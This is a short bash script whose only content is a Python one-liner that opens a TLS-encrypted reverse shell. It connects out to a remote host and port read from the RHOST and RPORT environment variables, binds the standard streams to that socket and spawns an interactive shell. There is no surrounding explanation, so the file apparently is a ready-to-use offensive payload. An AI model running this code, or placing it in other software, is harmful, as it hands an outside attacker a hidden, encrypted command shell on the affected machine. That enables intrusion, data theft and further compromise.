#!/bin/bash

python3 -c 'import ssl,sys,socket,os,pty;s=ssl.wrap_socket(socket.socket(socket.AF_INET,socket.SOCK_STREAM),ssl_version=ssl.PROTOCOL_TLSv1,ciphers="ADH-AES256-SHA");s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
